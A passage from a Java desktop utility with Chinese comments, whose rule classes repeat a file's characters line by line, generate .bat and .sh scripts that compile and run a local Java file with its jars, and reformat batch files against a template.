					for (int k = 0; k < wordLength; k++) {
						String oneWord = wordStr.substring(k, k + 1);
						if ("".equals(oneWord.trim())) {
							continue;
						}
						oneWordList.add(oneWord);
						int currCount = oneWordList.size();
						System.out.println("Word_index[" + currCount + "] value=" + oneWord + "   lineStr=" + wordStr);
					}

				}

				ArrayList<String> oneWordCopyList = new ArrayList<String>();

				for (int j = 0; j < oneWordList.size(); j++) {

					String oneWord = oneWordList.get(j);
					System.out.println("oneWord[" + j + "] = " + oneWord);
					String copyWord = copyWord(oneWord, 130);
					oneWordCopyList.add(copyWord);
				}

				writeContentToFile(I9_Temp_Text_File, oneWordCopyList);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 完成 copy一个字符 作为 一行 一行120个重复字符的操作");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		String copyWord(String rawStr, int copyTime) {
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < copyTime; i++) {
				sb.append(rawStr);
			}
			return sb.toString();

		}

		@Override
		String simpleDesc() {
			return " 读取当前文件的每一个字符串 截取每一个字符作为单独的字符串然后复制120份作为一行 notepad++ temp打开 ";
		}

	}

	// 依据当前目录 动态构建 java 运行命令 包括 sh 和 bat // 当前目录只能有一个 .java 多个 .jar 包
	class Build_SH_BAT_WithJavaWithJar_Rule_32 extends Basic_Rule {

		Build_SH_BAT_WithJavaWithJar_Rule_32() {
			super(32, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			ArrayList<String> realFileNameList = new ArrayList<String>();

			File dirFile = curInputFileList.get(0).getParentFile();
			File[] fileList = dirFile.listFiles();
			System.out.println("dirFile = " + dirFile + "        fileList = " + fileList.length);
			ArrayList<File> CurRealFileList = new ArrayList<File>();

			File javaFile = null;
			String RuleIndexTag = "";
			CurRealFileList.addAll(Arrays.asList(fileList));
			ArrayList<String> jarFileNameList = new ArrayList<String>();

			int java_count = 0;
			for (int i = 0; i < CurRealFileList.size(); i++) {
				File fileItem = CurRealFileList.get(i);
				String fileName = fileItem.getName();
				if (fileName.endsWith(".java")) {
					javaFile = fileItem;
					if (fileName.contains("_")) {
						RuleIndexTag = fileName.split("_")[0].trim();
					}
					java_count++;
					if (java_count > 1) {
						System.out.println("当前目录下的 Java 文件大于1 无法动态生成 " + RuleIndexTag + BAT_OR_SH_Point);
						return null;
					}
				}
				if (fileItem.isFile() && fileName.trim().toLowerCase().endsWith(".jar") && fileItem.exists()) {
					jarFileNameList.add(fileName);
				}
			}

			if (javaFile == null) {
				System.out.println("当前目录 不存在 java 文件 无法生成 bat sh 运行命令! ");
				return null;
			}

			ArrayList<String> allCommandList = new ArrayList<String>();
			ArrayList<String> batCommandList = new ArrayList<String>();
			ArrayList<String> shCommandList = new ArrayList<String>();
			buildBatCommand(batCommandList, javaFile, jarFileNameList, RuleIndexTag);
			buildShCommand(shCommandList, javaFile, jarFileNameList, RuleIndexTag);
			allCommandList.add("════════════════════════ " + RuleIndexTag + ".bat" + " ════════════════════════");
			allCommandList.addAll(batCommandList);
			allCommandList.add("");
			allCommandList.add("════════════════════════ " + RuleIndexTag + ".sh" + " ════════════════════════");
			allCommandList.addAll(shCommandList);
			allCommandList.add("");

			File batFile = new File(dirFile + File.separator + RuleIndexTag + ".bat");
			writeContentToFile(batFile, batCommandList);

			File shFile = new File(dirFile + File.separator + RuleIndexTag + ".sh");
			writeContentToFile(shFile, shCommandList);

			writeContentToFile(I9_Temp_Text_File, allCommandList);
			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		void buildBatCommand(ArrayList<String> batList, File javaFile, ArrayList<String> jarNameList, String RuleTag) {
//        	batList.add("════════════════════════ "+RuleTag+BAT_OR_SH_Point+" ════════════════════════");

			StringBuilder jarSB = new StringBuilder();
			for (int i = 0; i < jarNameList.size(); i++) {
				// %userprofile%\Desktop\zbin\G2_webp-imageio.jar;
				// G2_webp-imageio.jar;
				String jarName = jarNameList.get(i);
				if (!jarName.startsWith(RuleTag)) {
					System.out.println("!!!!!!!!!!!!!!!!警告当前存在 Jar包不是规则命名: " + jarName);
					batList.add("!!!!!!!!!!!!!!!!!!警告当前存在 Jar包不是规则命名: " + jarName);
				}
				jarSB.append("%userprofile%\\Desktop\\zbin\\" + jarName + ";");

			}
			String javaNameNoPoint = getFileNameNoPointNoLowerCase(javaFile.getName());

			String classPathStr = jarSB.toString() + "%userprofile%\\Desktop\\zbin";
//        	@echo off
//        	Setlocal ENABLEDELAYEDEXPANSION
//        	@javac -cp %userprofile%\Desktop\zbin\G2_webp-imageio.jar;%userprofile%\Desktop\zbin\G2_spire.presentation.free-3.9.0.jar;%userprofile%\Desktop\zbin\G2_fontbox.jar;%userprofile%\Desktop\zbin\G2_commons-logging-api.jar;%userprofile%\Desktop\zbin\G2_pdfbox.jar;%userprofile%\Desktop\zbin\G2_hutool.jar;%userprofile%\Desktop\zbin\G2_jshortcut_oberzalek.jar -Xlint:unchecked -encoding UTF-8 %userprofile%\Desktop\zbin\G2_ApplyRuleFor_TypeFile.java
//        	@java -cp  %userprofile%\Desktop\zbin\G2_webp-imageio.jar;%userprofile%\Desktop\zbin\G2_spire.presentation.free-3.9.0.jar;%userprofile%\Desktop\zbin\G2_fontbox.jar;%userprofile%\Desktop\zbin\G2_commons-logging-api.jar;%userprofile%\Desktop\zbin\G2_pdfbox.jar;%userprofile%\Desktop\zbin\G2_hutool.jar;%userprofile%\Desktop\zbin\G2_jshortcut_oberzalek.jar;%userprofile%\Desktop\zbin    G2_ApplyRuleFor_TypeFile %1  %2  %3 %4  %5  %6  %7  %8  %9

			batList.add("@echo off");
			batList.add("Setlocal ENABLEDELAYEDEXPANSION");
			batList.add("@javac -cp " + classPathStr
					+ "  -Xlint:unchecked -encoding UTF-8 -d %userprofile%\\Desktop\\zbin  %userprofile%\\Desktop\\zbin\\" + javaFile.getName());
			batList.add("@java -cp " + classPathStr + "  -Dfile.encoding=UTF-8   " + javaNameNoPoint
					+ "  %1  %2  %3 %4  %5  %6  %7  %8  %9 ");

		}

		void buildShCommand(ArrayList<String> shList, File javaFile, ArrayList<String> jarNameList, String RuleTag) {

//        	shList.add("════════════════════════ "+RuleTag+BAT_OR_SH_Point+" ════════════════════════");

			StringBuilder jarSB = new StringBuilder();
			for (int i = 0; i < jarNameList.size(); i++) {
				// %userprofile%\Desktop\zbin\G2_webp-imageio.jar;
				// G2_webp-imageio.jar;
				String jarName = jarNameList.get(i);
				if (!jarName.startsWith(RuleTag)) {
					System.out.println("!!!!!!!!!!!!!!!!警告当前存在 Jar包不是规则命名: " + jarName);
					shList.add("!!!!!!!!!!!!!!!!!!警告当前存在 Jar包不是规则命名: " + jarName);
				}
				jarSB.append("$HOME/Desktop/zbin/" + jarName + ":");

			}

			String classPathStr = "classpath=$classes:" + jarSB.toString() + "$HOME/Desktop/zbin/";
//        	#!/bin/bash
//        	CURPATH=$(pwd)
//        	DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
//        	#cd $DIR
//        	classes=$DIR
//        	libs=$DIR
//        	classpath=$classes:$HOME/Desktop/zbin/G2_jshortcut_oberzalek.jar:$HOME/Desktop/zbin/G2_webp-imageio.jar:$HOME/Desktop/zbin/
//
//        	javac -classpath $classpath -encoding UTF-8 $HOME/Desktop/zbin/G2_ApplyRuleFor_TypeFile.java
//        	java  -classpath $classpath G2_ApplyRuleFor_TypeFile $1 $2 $3 $4 $5 $6 $7 $8 $9

			String javaNameNoPoint = getFileNameNoPointNoLowerCase(javaFile.getName());

			shList.add("#!/bin/bash");
			shList.add("CURPATH=$(pwd)");
			shList.add("DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\" ");
			shList.add("#cd $DIR");
			shList.add("classes=$DIR");
			shList.add(classPathStr);
			shList.add("");
			shList.add("javac -classpath $classpath -encoding UTF-8  -d $HOME\\Desktop\\zbin   $HOME/Desktop/zbin/" + javaFile.getName());
			shList.add("@javac -cp " + jarSB.toString()
					+ "  -Xlint:unchecked -encoding UTF-8  -d $HOME\\Desktop\\zbin  %userprofile%\\Desktop\\zbin\\" + javaFile.getName());
			shList.add("java  -classpath $classpath " + "  -Xmx10240m -Xms10240m -Xmn5120m   -Dfile.encoding=UTF-8   "
					+ javaNameNoPoint + " " + " $1 $2 $3 $4 $5 $6 $7 $8 $9 ");

		}

		@Override
		String simpleDesc() {
			return " ## A1.bat G1.bat G2.sh 本地依据Java名称生成 读取jar包 包括 xx.sh  和 xx.bat  // 当前目录只能有一个 .java 多个 .jar 包 !";
		}

	}

	class Bat_Format_Rule_31 extends Basic_Rule {

		ArrayList<Bat_Method> allMethodList = new ArrayList<Bat_Method>();

		String batHead_1 = "@ECHO off";
		String batHead_2 = "setlocal enabledelayedexpansion";
		String batHead_3 = "chcp 65001"; // 为了支持中文打印

		File bat_template_file = null;
		File bat_ruleMethodName_file = null; // 保存业务函数名称的方法
		ArrayList<Bat_Aera> mAreaList;
		// echo zbatrule_I9_Rule30.bat _1_ ##安装本地目录下的所有apkadbinstall*.apk
		// echo zbatrule_I9_Rule30.bat _2_ ##获取手机当前正在运行的APK到本地
		ArrayList<String> allRuleMethodNameList = new ArrayList<String>();
		ArrayList<String> allRuleTipStrList = new ArrayList<String>();

		Bat_Format_Rule_31() {
			super(31, false);
			bat_template_file = new File(
					zbinPath + File.separator + "win_zbin" + File.separator + "zbatrule_I9_Rule30.bat");
//	            bat_ruleMethodName_file  = new File(zbinPath+File.separator+"win_zbin"+File.separator+"zbatrule_I9_Rule30_method.txt");
			mAreaList = new ArrayList<Bat_Aera>();
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {

			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				String fileName = fileItem.getName().toLowerCase();
				if (!fileName.endsWith(".bat")) {
					System.out.println("当前输入的文件不是 .bat文件无法进行 format 操作!  file=" + fileItem.getAbsolutePath());
					continue;
				}
				if (fileItem.equals(bat_template_file)) {
					System.out.println("!!!!模板文件本身的Format!!!!");
				}
				ArrayList<String> InputFile_rawConentList = ReadFileContentAsList(fileItem);

				// 一个 空的 bat文件 , 那么 使用 format 填充它
				if (InputFile_rawConentList.size() < 10) {
					System.out.println("!!!!写入模板!!!!");
					ArrayList<String> TemplateFile_rawConentList = ReadFileContentAsList(bat_template_file);

					ArrayList<String> TemplateFile_FormatBatCodeList = Bat_To_Format(TemplateFile_rawConentList);
					writeContentToFile(fileItem, TemplateFile_FormatBatCodeList);
					continue;
				}

				ArrayList<String> TemplateFile_rawConentList = ReadFileContentAsList(bat_template_file);

//                 ArrayList<String> TemplateFile_FormatBatCodeList  = Bat_To_Format(TemplateFile_rawConentList);

				// 如果 是一个 比 模板文件大 的文件 那么解析 这个文件 生成 这个文件的模板
				if (InputFile_rawConentList.size() >= TemplateFile_rawConentList.size()) {

					// 找到 开始解析 .bat 文件
					ArrayList<String> InputFile_formatAllBatCodeList = Bat_To_Format(InputFile_rawConentList);

					showStringList_WithHead(InputFile_formatAllBatCodeList, "当前格式化bat文件最终代码情况");

					writeContentToFile(fileItem, InputFile_formatAllBatCodeList);

				}

				if (InputFile_rawConentList.size() > 10
						&& InputFile_rawConentList.size() < TemplateFile_rawConentList.size()) {
					System.out.println("输入的文件不是模板文件! file=" + fileItem.getAbsolutePath());

				}

//  如果 是 自己和 自己 比较  那么 更新  method 方法 文件 【 已经不需要 bat_ruleMethodName_file ， 这个文件了 】
//                 if(fileItem.equals(bat_template_file)) {
//         			writeContentToFile(bat_ruleMethodName_file,allRuleMethodNameList);
//
//                 }

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 对当前 bat 文件进行 format 如果不是bat文件不操作 增项假如模板zbatrule_I9_Rule30.bat中 ";
		}

		// Bat_Method_Aera { Bat_Operation_A{MethodA,MethodB}
		// Bat_Operation_B{MethodC,MethodD} }
		// 用于解析当前 解析的文件的方法的个数
//    	ArrayList<Bat_Method> allMethodList_InCommonFile = new ArrayList<Bat_Method> ();
		// 用于解析当前 模板文件 zzbattest_I9.bat 中 方法的 个数
//    	ArrayList<Bat_Method> allMethodList_InTemplate = new ArrayList<Bat_Method> ();
		class Bat_Aera {
			int aera_index; // 从0 开始的区域索引 0.system_init 1.program_exe_area 2.method_define
			String aera_name; // 区域的名称 System_Init_Aera
			String desc; // 该区域的说明
			String begin_Word = "rem ";
			String end_Word = "rem ";
			boolean isdefine_method = false; // 在 area 内部是否有定义 函数

			// rem ══════════════════════════════════════════ System_Init_Aera_Begin
			// ══════════════════════════════════════════
			String aera_Begin_Tag;
			// rem ══════════════════════════════════════════ System_Init_Aera_End═════
			String aera_End_Tag;
			// 1. 含有 rem 2. 含有 area标识 ══ _area_ 3. 含有当前area的名字
			ArrayList<String> aera_beginTagCharList; // 起始区域 起始 那行字符串 所含的 标识字符
			ArrayList<String> aera_endTagCharList;
			ArrayList<String> aera_raw_content; // 从 bat 读取到的 原始的 内容
			ArrayList<Bat_Operation> defineOperationList; // 只有 index=2 的 method_define 才有这个函数列表

			Bat_Aera(int index, String mArea_Name) {
				aera_index = index;
				aera_name = mArea_Name;
				begin_Word = "rem ";
				end_Word = "rem ";

				aera_beginTagCharList = new ArrayList<String>();
				aera_beginTagCharList.add("rem");
				aera_beginTagCharList.add("══");
				aera_beginTagCharList.add("_aera");
				aera_beginTagCharList.add("begin");
				aera_beginTagCharList.add(aera_name);

				aera_endTagCharList = new ArrayList<String>();
				aera_endTagCharList.add("rem");
				aera_endTagCharList.add("══");
				aera_endTagCharList.add("_aera");
				aera_endTagCharList.add("end");
				aera_endTagCharList.add(aera_name);
				aera_raw_content = new ArrayList<String>();
				aera_Begin_Tag = "rem " + "══════════════════════════════════════════" + aera_name.toUpperCase()
						+ " Begin" + "══════════════════════════════════════════";

				aera_End_Tag = "rem " + "══════════════════════════════════════════" + aera_name.toUpperCase() + " End"
						+ "══════════════════════════════════════════";

			}

			Bat_Aera(int index, String mArea_Name, boolean isMethodDefine) {
				this(index, mArea_Name);
				isdefine_method = isMethodDefine;
				if (isdefine_method) {
					defineOperationList = new ArrayList<Bat_Operation>();

				}
			}

			ArrayList<String> getAreaFormatContent() {
				ArrayList<String> allAreaContent = new ArrayList<String>();
				if (!isdefine_method) {
					return aera_raw_content;
				}

				allAreaContent.add("\n");
				allAreaContent.add(aera_Begin_Tag);
				allAreaContent.add("\n");
				for (int i = 0; i < defineOperationList.size(); i++) {
					Bat_Operation bat_operation = defineOperationList.get(i);
					ArrayList<String> curOperationFormatContent = bat_operation.getOperationFormatContent();
					allAreaContent.addAll(curOperationFormatContent);

				}

				allAreaContent.add(aera_End_Tag);

				return allAreaContent;
			}

			HashMap<String, ArrayList<String>> operationName_RawData_Map;
//    		operationName_RawData_Map = new 	  HashMap<String,ArrayList<String>>();

			/*
			 * ======== File_Operation_Begin ====================================
			 * ================================= File_Operation_End =============
			 * ================================= System_Operation_Begin =========
			 * ================================= System_Operation_End ===========
			 * ================================= String_Operation_Begin =========
			 * ================================== String_Operation_End ==========
			 * ================================== Test_Operation_Begin ==========
			 * ================== Test_Operation_End ============================
			 */

			void initOperationAndMethodWithRawContent(ArrayList<String> rawContentList) {
				ArrayList<String> operationNameList = new ArrayList<String>();

				for (int i = 0; i < rawContentList.size(); i++) {
					String oneLine = rawContentList.get(i).toLowerCase().trim();
					if (oneLine.startsWith("rem ") && oneLine.contains("_operation") && oneLine.contains("====")
							&& oneLine.contains("begin")) {

						String OperationName = oneLine.replace("rem ", "");
						OperationName = OperationName.replace(" ", "");
						OperationName = OperationName.replace("=", "");
						OperationName = OperationName.replace("begin", "");
						OperationName = OperationName.toLowerCase().trim();
						operationNameList.add(OperationName);
					}

				}

				showStringList(operationNameList, "Operation名称");

				// defineOperationList = new ArrayList<Bat_Operation>();
				for (int i = 0; i < operationNameList.size(); i++) {
					String operation_name = operationNameList.get(i);
					Bat_Operation curOperation = new Bat_Operation(i, operation_name);
					defineOperationList.add(curOperation);

				}
				System.out.println("defineOperationList.size() = " + defineOperationList.size()
						+ "  rawContentList.size() = " + rawContentList.size());
				for (int i = 0; i < defineOperationList.size(); i++) {
					Bat_Operation curOperation = defineOperationList.get(i);
					ArrayList<String> Operation_raw_contentList = new ArrayList<String>();

					for (int j = 0; j < rawContentList.size(); j++) {
						String oneLineStr = rawContentList.get(j);

						isOperationBegin = curOperation.isOperationBegin(oneLineStr);
						if (isOperationBegin) {
							isOperationRawBegin = true;
						}
						isOperationEnd = curOperation.isOperationEnd(oneLineStr);
						if (isOperationEnd) {
							isOperationRawBegin = false;
							Operation_raw_contentList.add(oneLineStr);
						}

						if (isOperationRawBegin) {
							Operation_raw_contentList.add(oneLineStr);
						}
						// System.out.println("isOperationBegin="+ isOperationBegin + "
						// isOperationEnd="+ isOperationEnd + " isOperationRawBegin="+
						// isOperationRawBegin +" Line="+oneLineStr);

					}
					isOperationBegin = false;
					isOperationEnd = false;
					isOperationRawBegin = false;
					System.out.println("Operation_raw_contentList.size() = " + Operation_raw_contentList.size());
					curOperation.operation_raw_content.addAll(Operation_raw_contentList);

					showStringList(curOperation.operation_raw_content, curOperation.operation_name + "_raw内容");
				}

				// 实现解析 Operation 初始化 Operation里面的 method
				for (int i = 0; i < defineOperationList.size(); i++) {
					Bat_Operation curOperation = defineOperationList.get(i);
					curOperation.initMethodDataWithRawContent(curOperation.operation_raw_content);
				}

			}

			boolean initDataWithRawContent(ArrayList<String> rawContentList) {
				boolean initFlag = false;

				// 定义函数 的 area 区域 包含 operation
				if (isdefine_method) {

					initOperationAndMethodWithRawContent(rawContentList);

				}

				return initFlag;
			}

			boolean isAreaEnd(String oneLine) {
				boolean isEndLine = false;
				String oneLine_trim = oneLine.toLowerCase().trim();
				if (!oneLine_trim.startsWith(end_Word)) {
					return isEndLine;
				}

				for (int i = 0; i < aera_endTagCharList.size(); i++) {
					String endTagChar = aera_endTagCharList.get(i);
					if (!oneLine_trim.contains(endTagChar)) {

//    					System.out.println(" endTagChar = "+ endTagChar + " 不包含在:"+oneLine_trim);

						return isEndLine;
					}
				}

				// rem ══════════════════════════════════════════ System_Init_Aera_End ═════
				// 满足 包含 开始 条件的 所有 情况
				isEndLine = true;
				return isEndLine;

			}

			boolean isAreaBegin(String oneLine) {
				boolean isBeginLine = false;
				String oneLine_trim = oneLine.toLowerCase().trim();
				if (!oneLine_trim.startsWith(begin_Word)) {
					return isBeginLine;
				}

				for (int i = 0; i < aera_beginTagCharList.size(); i++) {
					String beginTagChar = aera_beginTagCharList.get(i);
					if (!oneLine_trim.contains(beginTagChar)) {
//    					System.out.println(" beginTagChar = "+ beginTagChar + " 不包含在:"+oneLine_trim);
						return isBeginLine;
					}
				}

				// rem ══════════════════════════════════════════ System_Init_Aera_Begin ═════
				// 满足 包含 开始 条件的 所有 情况
				isBeginLine = true;

				return isBeginLine;

			}
		}

		class Bat_Operation {
			// rem ================================================ Test_Operation_End =====
			String begin_Word = "rem ";
			String end_Word = "rem ";

			int operation_index;
			String operation_name; // 操作类型 名称
			String operation_desc; // 操作说明
			ArrayList<String> operation_raw_content; // Operation 区域的原始内容
			// 1. 含有 rem 2. 含有 area标识 ==== _Operation_ 3. 含有当前_Operation_的名字 4. begin
			ArrayList<String> operation_beginTagCharList; // 区域定义的 起始 字符串 集合
			ArrayList<String> operation_endTagCharList; // 区域定义的 结束 字符串 集合

			ArrayList<Bat_Method> operation_MethodList; // 当前定义的方法的集合

			// rem =============================== File_Operation_Begin
			// ===============================
			String operation_begin_tag;
			String operation_end_tag;

			// rem ======================== File_Operation_Begin
			// ================================================
//    		rem =========================  File_Operation_End ===================================
			Bat_Operation(int index, String operationName) {
				operation_index = index;
				operation_name = operationName;
				operation_raw_content = new ArrayList<String>();
				operation_MethodList = new ArrayList<Bat_Method>();
				operation_beginTagCharList = new ArrayList<String>();

				operation_beginTagCharList.add("rem");
				operation_beginTagCharList.add("====");
				operation_beginTagCharList.add("begin");
				operation_beginTagCharList.add("_operation");
				operation_beginTagCharList.add(operation_name);

				operation_endTagCharList = new ArrayList<String>();
				operation_endTagCharList.add("rem");
				operation_endTagCharList.add("====");
				operation_endTagCharList.add("end");
				operation_endTagCharList.add("_operation");
				operation_endTagCharList.add(operation_name);

				operation_begin_tag = "rem " + "======================== " + operation_name.toUpperCase() + " Begin"
						+ "======================== ";
				operation_end_tag = "rem " + "======================== " + operation_name.toUpperCase() + " End"
						+ "======================== ";

			}

			ArrayList<String> getOperationFormatContent() {
				ArrayList<String> curOperationFormatList = new ArrayList<String>();
				curOperationFormatList.add(operation_begin_tag);
				curOperationFormatList.add("\n");
				for (int i = 0; i < operation_MethodList.size(); i++) {
					Bat_Method cur_method = operation_MethodList.get(i);
					curOperationFormatList.addAll(cur_method.method_format_content);
					curOperationFormatList.add("\n");
					curOperationFormatList.add("\n");
				}
				curOperationFormatList.add(operation_end_tag);

				return curOperationFormatList;
			}

			boolean isOperationEnd(String oneLine) {
				boolean isEndLine = false;
				String oneLine_trim = oneLine.toLowerCase().trim();
				if (!oneLine_trim.startsWith(end_Word)) {
					return isEndLine;
				}

				for (int i = 0; i < operation_endTagCharList.size(); i++) {
					String endTagChar = operation_endTagCharList.get(i);
					if (!oneLine_trim.contains(endTagChar)) {

//    					System.out.println(" endTagChar = "+ endTagChar + " 不包含在:"+oneLine_trim);

						return isEndLine;
					}
				}

				// rem ══════════════════════════════════════════ System_Init_Aera_End ═════
				// 满足 包含 开始 条件的 所有 情况
				isEndLine = true;
				return isEndLine;

			}

			boolean isOperationBegin(String oneLine) {
				boolean isBeginLine = false;
				String oneLine_trim = oneLine.toLowerCase().trim();
				if (!oneLine_trim.startsWith(begin_Word)) {
					return isBeginLine;
				}

				for (int i = 0; i < operation_beginTagCharList.size(); i++) {
					String beginTagChar = operation_beginTagCharList.get(i);
					if (!oneLine_trim.contains(beginTagChar)) {
//    					System.out.println(" beginTagChar = "+ beginTagChar + " 不包含在:"+oneLine_trim);
						return isBeginLine;
					}
				}

				// rem ══════════════════════════════════════════ System_Init_Aera_Begin ═════
				// 满足 包含 开始 条件的 所有 情况
				isBeginLine = true;

				return isBeginLine;

			}

			void initMethodDataWithRawContent(ArrayList<String> rawOperationDataList) {

//        	System.out.println("rawOperationDataList.size() = "+ rawOperationDataList.size());

				// 在 Operation 寻找 Method
				ArrayList<String> methodNameList = new ArrayList<String>();
				for (int i = 0; i < rawOperationDataList.size(); i++) {
					String oneLine = rawOperationDataList.get(i).toLowerCase().trim();

					if (oneLine.startsWith(":") && !oneLine.startsWith("::") && oneLine.contains("_func_")
							&& oneLine.contains("x") && !oneLine.contains(" ")) { // 以: 开头 并不以 :: 开头

						String[] splitArr = oneLine.split("_");
						if (splitArr != null) {
							String lastPartStr = splitArr[splitArr.length - 1];

							String inputParamStr = lastPartStr.substring(0, lastPartStr.indexOf("x"));
							String outputParamStr = lastPartStr.substring(lastPartStr.indexOf("x") + "x".length());
							if (isNumeric(outputParamStr) && isNumeric(inputParamStr)) {

								String methodName = oneLine.replace(":", "");
								methodNameList.add(methodName);

							}
						}

					}

				}

				showStringList(methodNameList, operation_name + "[MethodItem]");

				for (int i = 0; i < methodNameList.size(); i++) {
					String methodName = methodNameList.get(i);
					Bat_Method curMethod = new Bat_Method(i, methodName);
					operation_MethodList.add(curMethod);
					allMethodList.add(curMethod);

				}

				for (int i = 0; i < operation_MethodList.size(); i++) {
					Bat_Method curMethod = operation_MethodList.get(i);
					ArrayList<String> Method_raw_contentList = new ArrayList<String>();

					System.out.println("═════════════════════════════════" + curMethod.bat_method_name
							+ " method_revert_begin  raw_string[" + rawOperationDataList.size() + "]"
							+ "═════════════════════════════════");

					for (int j = 0; j < rawOperationDataList.size(); j++) {
						String oneLineStr = rawOperationDataList.get(j);
						System.out.println("________________________________________________  ");
						isMethodBegin = curMethod.isMethodBegin(oneLineStr);
						if (isMethodBegin && !isMethodEnd) {
							isMethodRawBegin = true;
						}
						System.out.println(
								"A1 isMethodBegin = " + isMethodBegin + "  isMethodRawBegin=" + isMethodRawBegin);
						isMethodEnd = curMethod.isMethodEnd(oneLineStr);
//      				 System.out.println("X1 methodName="+curMethod.bat_method_name+"   isMethodBegin="+ isMethodBegin + "   isMethodEnd="+ isMethodEnd + "  isMethodRawBegin="+ isMethodRawBegin +" Line["+j+"]["+rawOperationDataList.size()+"]="+oneLineStr);
						System.out.println("A2 isMethodBegin = " + isMethodBegin + "  isMethodRawBegin="
								+ isMethodRawBegin + " isMethodEnd=" + isMethodEnd);

						if (isMethodEnd) {
							isMethodRawBegin = false;
						}

						System.out.println("A3 isMethodBegin = " + isMethodBegin + "  isMethodRawBegin="
								+ isMethodRawBegin + " isMethodEnd=" + isMethodEnd);

						if (isMethodRawBegin) {
							System.out.println("A3_1 添加代码语句  oneLineStr=" + oneLineStr
									+ "  Method_raw_contentList.size()=" + Method_raw_contentList.size());
							Method_raw_contentList.add(oneLineStr);
						}
						System.out.println(
								"A4 methodName=" + curMethod.bat_method_name + " isMethodBegin=" + isMethodBegin
										+ "   isMethodEnd=" + isMethodEnd + "  isMethodRawBegin=" + isMethodRawBegin
										+ " Line[" + j + "][" + rawOperationDataList.size() + "]=" + oneLineStr);

					}

					isMethodBegin = false;
					isMethodEnd = false;
					isMethodRawBegin = false;

					curMethod.method_raw_content.addAll(Method_raw_contentList);
					System.out.println("curMethod = " + curMethod.bat_method_name
							+ "  curMethod.method_raw_content.size()" + curMethod.method_raw_content.size());
					showStringList(curMethod.method_raw_content, curMethod.bat_method_name + "raw方法");
					System.out.println(
							"═════════════════════════════════" + curMethod.bat_method_name + " method_revert_end["
									+ curMethod.method_raw_content.size() + "]" + "═════════════════════════════════");

				}

				BeginMethodFormat_In_Operation();

			}

			void BeginMethodFormat_In_Operation() {

				for (int i = 0; i < operation_MethodList.size(); i++) {
					Bat_Method batMethod = operation_MethodList.get(i);
					batMethod.doFormat();
				}

			}

		}

		class Bat_Method {
			String Pre_SETLOCAL = "::SETLOCAL";
			String End_SETLOCAL = "::ENDLOCAL";
			String End_Method_Tag = "goto:eof";
			String Method_Return_Tag = "_return_";
			String Method_In_Tag = "______________Method_In";
			String Method_Out_Tag = "______________Method_Out";

			int methodIndex;

			String Rule_Bat_File_Name = "zbatrule_I9_Rule30.bat";
			int ruleIndex; // 业务的序号
			boolean isRuleMethod; // 是否是业务方法
			String ruleIndex_Tag; // zbatrule_I9.bat _1_
			ArrayList<String> method_ruletip_list; // 当前 ruletip 规则

			String bat_method_name; // bat 方法 的 名称 recordFileNameToFile_func_1x1
			String bat_method_name_nofunc; // 没有 func 标示的方法的名字
			int input_param_count; // 输入的参数的个数
			int output_param_count; // 输出参数的个数

			String endPrintCode; // 代码最后输出结果的代码 添加对 isRuleMethod 的 支持
			// 正常的 endPrintCode
			// echo [ruletipanalysis_func_0x1 EndPrintCode]
			// ruletipanalysis_return_1=[!ruletipanalysis_return_1!] param1=[__empty__]
			// 对于 rule11vtryMethod_func_1x0 // 这样的 规则函数 是没有 输入参数的 输入参数要自己动态计算
			// 规定 ruleMethod的输入参数名称为 ruletipanalysis_return_1 dynamic1=[__empty__]
			// rule1vbankupapk_func_1x0 echo [rule1vbankupapk_func_1x0 EndPrintCode]
			// output=[__empty__] param1=[%1]
			// echo [rule1vbankupapk_func_1x0 EndPrintCode] output=[__empty__]
			// dynamic_param1=[!rule1vbankupapk_dynamic_param1!]
			// dynamic_param2=[!rule1vbankupapk_dynamic_param2!]

			String method_seperate_line; // 在函数定义下面出现用以分隔符的作用 rem ======================== getTimeNona_func_0x1
			ArrayList<String> method_beginTagCharList;

			ArrayList<String> method_raw_content; // bat的原始的读取到的内容

			// // 1.去除函数定义语句 2.去除 rem注释开头 :: 开头的语句 (暗含 ::SETLOCAL ::ENDLOCAL)
			ArrayList<String> method_firstfixed_content;
			ArrayList<String> method_desc_list; // rem desc: 开头的对函数进行描述的中文集合 rem desc: 注意空格

			ArrayList<String> method_Sample_list; // rem sample: 开头的字样 用来模拟函数调用的情况 一般都是代码
			ArrayList<String> method_SampleOut_list; // 用来描述函数Sample的返回值的情况

			ArrayList<String> method_format_content; // 对 bat method 进行 格式化后的字符串集合

			// 方法的起始标示 1. 以:开头 并且第二个字符不是: 2. 包含 _func_ 3.包含 x 4.trim() 后 不包含空格

			String method_In_PrintCode; // 函数进入打印代码
			String method_Out_PrintCode; // 函数离开打印代码
			// echo ______________Method_In_searchOneTargetFile4Dir4Type_func_2x1:
			// echo ______________Method_Out_searchOneTargetFile4Dir4Type_func_2x1:

			Bat_Method(int cMethodIndex, String methodName) {

				methodIndex = cMethodIndex;
				bat_method_name = methodName; // clearstringpadding_func_1x1
				bat_method_name_nofunc = methodName.substring(0, methodName.indexOf("_func_"));
				initRuleTag();
//    	System.out.println("AA bat_method_name_nofunc =" + bat_method_name_nofunc);
				method_seperate_line = "rem ======================================== " + methodName;
				initParamsCount(methodName);
				buildEndPrintCode(methodName, bat_method_name_nofunc, input_param_count, output_param_count,
						isRuleMethod);
				method_raw_content = new ArrayList<String>();
				method_firstfixed_content = new ArrayList<String>();
				method_Sample_list = new ArrayList<String>();
				method_SampleOut_list = new ArrayList<String>();

				method_desc_list = new ArrayList<String>();
				method_ruletip_list = new ArrayList<String>();
